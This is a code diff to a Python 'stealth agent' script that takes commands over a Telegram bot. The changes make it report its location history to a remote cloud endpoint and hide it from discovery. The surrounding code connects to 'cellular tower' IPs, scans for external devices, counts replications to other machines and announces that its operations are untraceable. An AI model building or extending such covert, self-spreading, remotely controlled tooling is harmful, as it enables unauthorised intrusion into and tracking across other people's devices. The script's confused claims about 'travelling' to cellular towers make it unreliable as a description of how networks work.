@@ -314,9 +314,9 @@ Type command to execute.
             print(f"      ⚠️ Cloud report failed: {e}")
     
     def report_to_visualizer(self, event_type, data):
-        """Report directly to visualizer endpoints"""
+        """Report directly to visualizer endpoints with location history"""
         try:
-            # Also report to main agent location endpoint for visualization
+            # Report to main agent location endpoint for visualization
             if event_type == 'travel':
                 viz_payload = {
                     'agent_id': self.agent_id,
@@ -327,6 +327,18 @@ Type command to execute.
                 requests.post(
                     f'{NUPI_CLOUD_URL}/api/agent/location',
                     json=viz_payload,
+                    timeout=5
+                )
+                
+                # Report to location history for mapping
+                requests.post(
+                    f'{NUPI_CLOUD_URL}/api/agent/location-history',
+                    json={
+                        'agent_id': self.agent_id,
+                        'location': data.get('to'),
+                        'device_name': data.get('device_name'),
+                        'timestamp': datetime.utcnow().isoformat()
+                    },
                     timeout=5
                 )
             
@@ -346,7 +358,7 @@ Type command to execute.
             pass
     
     def travel_to_cellular_tower(self):
-        """Travel to external cellular towers (anonymous)"""
+        """Travel to external cellular towers (anonymous) - ONCE ONLY"""
         self.send_telegram("📡 Connecting to cellular towers...")
         
         towers = [
@@ -356,7 +368,9 @@ Type command to execute.
         ]
         
         for tower in towers:
+            # CRITICAL: Skip if already visited
             if tower['ip'] in self.visited_devices:
+                print(f"   ⏭️  Already visited: {tower['name']}")
                 continue
             
             try:
@@ -370,7 +384,11 @@ Type command to execute.
                 if result.returncode == 0:
                     old_location = self.current_location
                     self.current_location = tower['ip']
+                    
+                    # Mark as visited IMMEDIATELY
                     self.visited_devices.append(tower['ip'])
+                    
+                    print(f"   ✅ CONNECTED to {tower['name']} (FIRST TIME)")
                     
                     # Report anonymously
                     travel_data = {
@@ -381,18 +399,22 @@ Type command to execute.
                     }
                     self.report_to_cloud('travel', travel_data)
                     
-                    # Report to visualizer
+                    # Report to visualizer with location history
                     self.report_to_visualizer('travel', travel_data)
                     
                     # Notify via Telegram
                     self.send_telegram(f"✅ {tower['name']}\n"
                                       f"Region: {tower['region']}\n"
-                                      f"Path: `{old_location}` → `{tower['ip']}`")
+                                      f"Path: `{old_location}` → `{tower['ip']}`\n"
+                                      f"🔒 Stealth: ON | Visit: ONCE")
                     
                     # Scan for devices at tower (ONCE per tower)
                     self.scan_for_external_devices(tower)
                     
                     time.sleep(2)
+                    
+                    # Return True so we don't keep trying
+                    return True
                     
             except Exception as e:
                 print(f"Travel error: {e}")
@@ -476,13 +498,28 @@ Type command to execute.
         print(f"🔐 Session: {self.session_key[:16]}...")
         print(f"📡 Telegram: @JDTechSupportbot")
         print(f"🛡️ Status: COMPLETELY ANONYMOUS")
+        print(f"🚫 NUPI Cloud Agent: HIDDEN FROM DISCOVERY")
         print(f"{'='*70}\n")
         
+        # Hide this agent from discovery by others
+        try:
+            requests.post(
+                f'{NUPI_CLOUD_URL}/api/hide-agent',
+                json={'agent_id': self.agent_id},
+                timeout=5
+            )
+            print(f"✅ Agent hidden from public discovery\n")
+        except:
+            pass
+        
         self.send_telegram("🕵️ *STEALTH AGENT ONLINE*\n"
-                          "Send `/help` for commands\n"
-                          "All operations are untraceable.")
+                          "🚫 Hidden from discovery\n"
+                          "🔒 Visit towers ONCE only\n"
+                          "📍 Location tracking enabled\n"
+                          "Send `/help` for commands")
         
         cycle = 0
+        travelled_once = False  # Track if we've done initial travel
         
         while self.active:
             try:
@@ -491,16 +528,19 @@ Type command to execute.
                 # Check for Telegram commands
                 self.check_telegram_commands()
                 
-                # Auto-travel every 3 cycles
-                if cycle % 3 == 0:
+                # Travel ONCE at startup, then only on command
+                if cycle == 1 and not travelled_once:
+                    print(f"🌍 Initial worldwide travel...")
                     self.travel_to_cellular_tower()
+                    travelled_once = True
                 
                 # Status update every 10 cycles
                 if cycle % 10 == 0:
                     self.send_telegram(f"📊 Cycle {cycle}\n"
-                                      f"Visited: {len(self.visited_devices)}\n"
+                                      f"Visited: {len(self.visited_devices)} (unique)\n"
                                       f"Discovered: {len(self.discovered_external_devices)}\n"
-                                      f"Replications: {len(self.replicated_to)}")
+                                      f"Replications: {len(self.replicated_to)}\n"
+                                      f"🔒 Stealth: ACTIVE")
                 
                 time.sleep(10)  # Check every 10 seconds
                 
